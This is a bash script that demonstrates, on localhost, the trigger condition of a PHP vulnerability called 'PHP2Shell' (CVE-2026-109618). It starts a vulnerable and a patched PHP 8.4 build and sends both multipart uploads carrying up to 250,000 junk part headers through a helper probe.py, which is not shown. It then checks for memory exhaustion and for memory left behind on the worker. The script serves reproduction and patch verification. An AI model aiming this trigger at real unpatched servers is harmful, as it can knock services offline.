#!/usr/bin/env bash
#
# One-command A/B demonstration of the PHP2Shell trigger condition
# (CVE-2026-109618). Local-only; starts two PHP versions, sends the same
# payload to both, prints a verdict per step.
#
#   ./fetch-php.sh 8.4.26 && ./fetch-php.sh 8.4.27 && ./demo.sh
#
set -u
cd "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

VP=8426      # vulnerable PHP
PP=8427      # patched PHP
MEM=64M
PMS=256M

V_PID=""; P_PID=""
cleanup() { [ -n "$V_PID" ] && kill "$V_PID" 2>/dev/null; [ -n "$P_PID" ] && kill "$P_PID" 2>/dev/null; }
trap cleanup EXIT

hr() { printf '\n\033[1m%s\033[0m\n' "$*"; }
serve() { ./phpv.sh "$1" -d memory_limit=$MEM -d post_max_size=$PMS \
            -d display_errors=1 -d error_reporting=E_ALL -S "127.0.0.1:$2" -t www >/dev/null 2>&1 & }

hr "STEP 0 - runtimes"
./phpv.sh 8.4.26 -v | head -1 | sed 's/^/   VULNERABLE : /'
./phpv.sh 8.4.27 -v | head -1 | sed 's/^/   PATCHED    : /'
echo "   limits     : memory_limit=$MEM  post_max_size=$PMS"

hr "STEP 1 - start two identical servers, only the PHP version differs"
serve 8.4.26 $VP; V_PID=$!
serve 8.4.27 $PP; P_PID=$!
sleep 2
echo "   vuln  -> http://127.0.0.1:$VP  (pid $V_PID)"
echo "   patch -> http://127.0.0.1:$PP  (pid $P_PID)"

hr "STEP 2 - baseline: a normal request on each"
for p in $VP $PP; do
  echo "   --- port $p ---"
  curl -s -m 5 "http://127.0.0.1:$p/index.php" | sed 's/^/       /'
done

hr "STEP 3 - amplification: cost of one part header inside PHP"
echo "   Benign upload; only the NUMBER of junk headers varies. Watch 'peak='."
for n in 10000 100000 200000; do
  echo "   --- $n headers ---"
  python3 probe.py --port $VP --headers $n 2>&1 | sed 's/^/     /'
done

hr "STEP 4 - push past memory_limit on the VULNERABLE build"
python3 probe.py --port $VP --headers 250000 2>&1 | sed 's/^/     /'

hr "STEP 5 - the SAME payload against the PATCHED build"
python3 probe.py --port $PP --headers 250000 2>&1 | sed 's/^/     /'

hr "STEP 6 - does the aborted request leave state on the worker?"
echo "   Restart the vulnerable server so we begin from a clean worker:"
kill "$V_PID" 2>/dev/null
serve 8.4.26 $VP; V_PID=$!
sleep 2
printf '     clean worker, GET      : '; curl -s -m 5 "http://127.0.0.1:$VP/index.php" | grep -o 'peak=[0-9]*'
python3 probe.py --port $VP --headers 250000 --quiet >/dev/null 2>&1
printf '     after the trigger, GET : '; curl -s -m 5 "http://127.0.0.1:$VP/index.php" | grep -o 'peak=[0-9]*'
printf '     one more GET           : '; curl -s -m 5 "http://127.0.0.1:$VP/index.php" | grep -o 'peak=[0-9]*'
echo "   (same trivial request; memory carried out of the aborted one)"

hr "DONE - reading the verdicts"
echo "   'APP REACHED'        request parsed, application code ran"
echo "   'OOM ... NEVER ran'  aborted during startup parsing  == TRIGGERED"
echo "   'NO RESPONSE'        worker died outright"
